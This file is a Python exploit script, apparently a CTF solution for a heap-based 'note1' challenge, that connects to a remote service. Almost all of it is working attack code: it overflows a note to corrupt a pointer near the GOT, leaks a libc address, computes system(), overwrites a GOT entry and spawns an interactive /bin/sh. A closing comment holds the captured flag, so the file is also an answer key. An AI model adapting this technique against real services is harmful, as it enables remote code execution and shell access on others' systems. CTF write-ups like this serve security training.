#!/usr/bin/env python
# coding:utf-8

from ctf import *

# io = process('./note1_2bcb4f027de3daec321d8de37bca14af')
# io = debug('./note1_2bcb4f027de3daec321d8de37bca14af'); io.r()
io = remote('115.28.27.103', 9001)

elf = ELF('./note1_2bcb4f027de3daec321d8de37bca14af')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc-2.19.so_3f6aaa980b58f7c7590dee12d731e099')

def new_note(title, note_type='A', content='A'):
    io.sendline(1)
    io.sendline(title)
    io.sendline(note_type)
    io.sendline(content)

def delete_note(title):
    io.sendline(4)
    io.sendline(title)

def edit_note(title, content):
    io.sendline(3)
    io.sendline(title)
    io.sendline(content)

def show_note():
    io.sendline(2)

new_note('A')
new_note('B')

payload = cyclic(272)
payload += p64(0)
# payload += p64(elf.got['atoi'] - 96)
payload += p64(0x602000 - 0x10)
edit_note('A', payload)
delete_note('')

io.clean()
show_note()
io.recvuntil('title=')
title = io.recvuntil(',', drop=True)
io.recvuntil('type=')
libc_start_main_addr = unpack(io.recvuntil(',', drop=True), 'all')
libc_base = libc_start_main_addr - libc.symbols['__libc_start_main']
system_addr = libc_base + libc.symbols['system']
log.info('libc start main address: %#x', libc_start_main_addr)
# print hex(stack_check_fail_addr)

payload = p64(elf.plt['setvbuf'] + 8)
payload += p64(system_addr)
edit_note(title, payload)
io.sendline('/bin/sh')

# io.interrupt()
# io.sendline('x/4xg 0x00000000006020B0')
# io.sendline('x/40xg 0x0000000000603190')

io.interactive()

# ZCTF{3n@B1e_Nx_IS_n0t_3nougH!!}
